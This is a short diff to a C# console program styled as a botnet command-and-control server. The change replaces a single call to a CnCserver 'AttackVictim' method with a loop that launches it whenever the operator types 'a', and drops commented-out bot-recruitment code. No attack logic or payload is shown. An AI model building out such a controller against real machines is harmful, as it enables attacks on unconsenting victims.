@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Threading;
 
 namespace Command_and_Control
 {
@@ -10,14 +11,18 @@ namespace Command_and_Control
     {
         static void Main(string[] args)
         {
-            Console.Title = "C&C";
+            Console.Title = "Command and Control";
 
             CnCserver cc = new CnCserver();
-            cc.AttackVictim();
-            //Thread searchBot = new Thread(() => { cc.AddBots(); });
-            //searchBot.Start();
 
-            Console.ReadLine();
+            string inn;
+            while (true)
+            {
+                if ((inn = Console.ReadLine()).Equals("a"))
+                {
+                    cc.AttackVictim();
+                }
+            }
         }
     }
 }
